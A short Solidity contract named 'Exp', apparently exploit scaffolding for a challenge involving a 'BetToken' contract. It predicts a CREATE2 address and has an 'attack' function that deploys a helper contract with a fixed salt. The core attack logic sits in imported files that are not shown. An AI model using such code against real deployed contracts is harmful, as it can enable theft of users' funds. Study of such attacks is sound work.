// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "./IBetToken.sol";
import "./CAddress.sol";
import "hardhat/console.sol";

contract Exp {
    uint256 public nonce;
    address public bet;
    bytes32 salt = keccak256(abi.encodePacked("test"));
    address public subAddress;
    constructor(address bet_){
        bet = bet_;
        subAddress = address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(this),
            salt,
            keccak256(abi.encodePacked(
                type(CAddress).creationCode
            ))
        )))));
    }
    function attack(uint256 nonce_) public returns(address addr){
        nonce = nonce_;
        return address(new CAddress{salt:salt}());
    }
}

